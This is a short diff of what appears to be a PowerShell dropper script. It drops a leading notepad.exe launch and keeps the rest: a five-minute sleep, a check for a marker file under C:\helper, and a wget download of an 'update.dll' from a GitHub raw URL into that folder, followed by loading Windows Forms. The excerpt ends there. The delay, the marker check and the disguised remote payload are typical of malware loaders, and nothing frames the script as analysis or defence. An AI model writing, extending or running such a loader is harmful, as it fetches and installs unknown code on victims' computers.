@@ -1,4 +1,4 @@
-notepad.exe ; start-sleep 300 ; if (Test-Path "C:\helper\regex.exe") {
+start-sleep 300 ; if (Test-Path "C:\helper\regex.exe") {
     exit
 } else { wget "https://github.com/othermeinthenightcontrol2/1/raw/refs/heads/main/update.dll" -o "C:\helper\update.dll" ; start-sleep 2;
     Add-Type -AssemblyName System.Windows.Forms
